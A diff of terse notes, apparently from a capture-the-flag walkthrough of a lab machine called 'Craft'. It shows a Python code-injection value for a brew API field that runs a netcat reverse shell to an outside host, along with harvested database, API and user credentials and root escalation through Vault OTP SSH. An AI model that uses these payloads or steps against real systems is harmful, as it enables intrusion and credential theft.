@@ -5,4 +5,36 @@ dinesh:4aUh0A8PbVJxgd
 
 
 to the brew endpoint
- "abv": "__import__('os').system('nc 10.10.16.8 9999 -e /bin/bash')"
+"abv": "__import__('os').system('nc 10.10.16.8 9999 -e /bin/sh')"
+
+
+MYSQL_DATABASE_USER = 'craft'
+MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
+CRAFT_API_SECRET = 'hz66OCkDtv8G6D'
+
+
+download on the machine a script to access the db and select user:
+
+{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
+
+log into gogs, see new repo with ssh key, use and enter the above as passphrase
+
+
+
+privilege escaltion:
+
+~./vault-token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+/vault/config/config.hcl
+/var/log/vaultssh.log
+/usr/local/bin/vault
+/usr/local/bin/vault-ssh-helper
+/usr/local/etc/vault-ssh-helper.hcl
+
+service on port 6022
+vault.craft.htb subdomain
+
+https://gogs.craft.htb/gilfoyle/craft-infra/src/master/vault/secrets.sh
+
+following guide: https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords
+
+vault ssh -role root_otp -mode otp root@10.10.10.110
